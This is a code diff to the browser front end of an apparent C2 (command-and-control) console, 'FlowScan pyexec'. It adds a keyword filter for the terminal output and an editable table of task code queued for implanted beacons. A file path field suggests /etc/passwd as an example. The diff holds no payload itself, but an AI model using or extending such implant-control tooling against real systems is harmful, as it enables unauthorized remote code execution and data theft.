@@ -103,6 +103,11 @@
                 <div class="term-body" id="c2-output">
                     <div class="term-line tinfo"><span class="term-ts"></span><span>FlowScan pyexec C2 控制台 · Tab 补全命令/模块/beacon（含说明）· ↑↓ 选择 · 回车确认 · Esc 关闭</span></div>
                 </div>
+                <div style="display:flex;gap:8px;padding:8px 12px 0;align-items:center;">
+                    <span style="font-size:0.72rem;color:#8a93a3;white-space:nowrap;user-select:none;">行过滤:</span>
+                    <input type="text" id="c2-filter-inc" class="form-control form-control-sm" placeholder="只显示包含关键字的行（留空=不过滤）" oninput="applyTermFilter()" aria-label="只显示包含关键字的行">
+                    <input type="text" id="c2-filter-exc" class="form-control form-control-sm" placeholder="不显示包含关键字的行（留空=不过滤）" oninput="applyTermFilter()" aria-label="不显示包含关键字的行">
+                </div>
                 <div class="term-input-bar">
                     <span class="term-prompt">pyexec&gt;</span>
                     <textarea id="c2-cmd" class="term-input" rows="1" autocomplete="off" spellcheck="false" aria-label="C2 命令输入"
@@ -231,7 +236,8 @@
         </div>
         <div id="bd-info" class="help-text" style="margin-bottom:10px;font-family:var(--font-mono);font-size:0.75rem;white-space:pre-wrap;"></div>
         <h3 style="font-size:0.85rem;margin:10px 0 6px;">待办任务</h3>
-        <div id="bd-tasks" class="help-text" style="font-family:var(--font-mono);font-size:0.72rem;max-height:140px;overflow:auto;"></div>
+        <div id="bd-tasks" style="font-family:var(--font-mono);font-size:0.72rem;max-height:200px;overflow:auto;border:1px solid var(--border);border-radius:8px;"></div>
+        <p class="help-text" style="margin:4px 0 0;">服务端队列中的待办任务(未下发);修改/删除后下一个回连周期生效。</p>
         <h3 style="font-size:0.85rem;margin:10px 0 6px;">文件操作</h3>
         <div class="form-row" style="gap:6px;flex-wrap:wrap;">
             <input type="text" id="bd-fpath" class="form-control" placeholder="路径(如 /etc/passwd 或 C:\\x.txt)" style="flex:1;min-width:180px;font-size:0.75rem;font-family:var(--font-mono);" aria-label="文件路径">
@@ -924,8 +930,27 @@ function termAppend(text, cls) {
         div.appendChild(ts);
         div.appendChild(body);
         c2out.appendChild(div);
+        if (!termLineVisible(line)) div.style.display = 'none';  // 行过滤生效时隐藏新行
     }
     while (c2out.children.length > TERM_MAX_LINES) c2out.removeChild(c2out.firstChild);
+    if (termAutoScroll) c2out.scrollTop = c2out.scrollHeight;
+}
+
+// ── 行过滤(只显示包含 / 不显示包含关键字的行)──
+function termLineVisible(line) {
+    const inc = document.getElementById('c2-filter-inc').value.trim();
+    const exc = document.getElementById('c2-filter-exc').value.trim();
+    if (inc && !line.includes(inc)) return false;
+    if (exc && line.includes(exc)) return false;
+    return true;
+}
+
+function applyTermFilter() {
+    for (const div of c2out.querySelectorAll('.term-line')) {
+        const body = div.querySelector('.term-line-body');
+        const txt = body ? body.textContent : '';
+        div.style.display = termLineVisible(txt) ? '' : 'none';
+    }
     if (termAutoScroll) c2out.scrollTop = c2out.scrollHeight;
 }
 
@@ -1656,18 +1681,69 @@ async function openBeaconDetail(bid) {
     }
 }
 
+let bdTasksCache = [];
+
 function renderBdTasks() {
     const box = document.getElementById('bd-tasks');
     if (!bdBeacon) return;
     const tasks = bdBeacon.tasks || [];
     if (!tasks.length) {
         // v2 批量模型: 任务一次性下发至 implant 本地队列,服务端队列下发即空
-        box.textContent = '（服务端无待办——批量模式下任务已一次性下发至 implant 本地队列，执行结果回连时带回）';
+        box.innerHTML = '<div style="padding:8px 10px;">（服务端无待办——批量模式下任务已一次性下发至 implant 本地队列，执行结果回连时带回）</div>';
         return;
     }
-    box.textContent = tasks.map(function(t) {
-        return '[' + (t.is_init ? 'init' : 'task') + '] ' + (t.task_id || '').slice(0, 8) + ' ' + fmtLocal(t.created_at) + ' ' + (t.result_processor ? '(proc:' + t.result_processor + ')' : '') + ' :: ' + (t.code_preview || '');
-    }).join('\n');
+    bdTasksCache = tasks;
+    const th = 'style="padding:5px 8px;border-bottom:1px solid var(--border);text-align:left;white-space:nowrap;font-weight:600;"';
+    const td = 'style="padding:5px 8px;border-bottom:1px solid var(--border);vertical-align:top;"';
+    let html = '<table style="width:100%;border-collapse:collapse;font-size:0.72rem;">'
+        + '<thead><tr>' + '<th ' + th + '>task_id</th><th ' + th + '>类型</th><th ' + th + '>创建时间</th>'
+        + '<th ' + th + '>代码</th><th ' + th + '>操作</th></tr></thead><tbody>';
+    tasks.forEach(function(t) {
+        const tid = escapeHtml(t.task_id || '');
+        html += '<tr>'
+            + '<td ' + td + ' style="white-space:nowrap;" title="' + tid + '">' + tid.slice(0, 8) + '</td>'
+            + '<td ' + td + ' style="white-space:nowrap;">' + (t.is_init ? '<span style="color:#fbbf24;">init</span>' : 'task') + '</td>'
+            + '<td ' + td + ' style="white-space:nowrap;">' + fmtLocal(t.created_at) + '</td>'
+            + '<td ' + td + ' style="word-break:break-all;max-width:340px;">' + escapeHtml(t.code_preview || '') + '</td>'
+            + '<td ' + td + ' style="white-space:nowrap;">'
+            + '<button class="btn btn-sm" style="padding:0 7px;font-size:0.68rem;" onclick="editBdTask(\'' + t.task_id + '\')" title="修改任务代码">编辑</button> '
+            + '<button class="btn btn-sm" style="padding:0 7px;font-size:0.68rem;" onclick="deleteBdTask(\'' + t.task_id + '\')" title="删除任务">删除</button>'
+            + '</td></tr>';
+    });
+    html += '</tbody></table>';
+    box.innerHTML = html;
+}
+
+async function editBdTask(taskId) {
+    const t = (bdTasksCache || []).find(function(x) { return x.task_id === taskId; });
+    if (!t || !bdBeacon) return;
+    const code = await fs3Prompt(
+        '修改任务 ' + t.task_id.slice(0, 8) + ' 的代码(完整替换, 下一个回连周期下发):',
+        t.code || t.code_preview || '', '任务代码', true);
+    if (code === null || code === undefined) return;  // 取消
+    if (!String(code).trim()) { fs3Alert('代码不能为空'); return; }
+    try {
+        const resp = await fetch('/api/c2/task/update', {method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({client_id: bdBeacon.client_id, task_id: taskId, code: String(code)})});
+        const data = await resp.json();
+        if (!data.ok) { fs3Alert('修改失败: ' + (data.error || '')); return; }
+        fs3Alert('任务已修改');
+        openBeaconDetail(bdBeacon.client_id);
+    } catch (e) { fs3Alert('修改失败: ' + e.message); }
+}
+
+async function deleteBdTask(taskId) {
+    if (!bdBeacon) return;
+    const ok = await fs3Confirm('确认删除任务 ' + taskId.slice(0, 8) + ' ？删除后无法恢复。');
+    if (!ok) return;
+    try {
+        const resp = await fetch('/api/c2/task/delete', {method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({client_id: bdBeacon.client_id, task_id: taskId})});
+        const data = await resp.json();
+        if (!data.ok) { fs3Alert('删除失败: ' + (data.error || '')); return; }
+        fs3Alert('任务已删除');
+        openBeaconDetail(bdBeacon.client_id);
+    } catch (e) { fs3Alert('删除失败: ' + e.message); }
 }
 
 function closeBeaconDetail() {
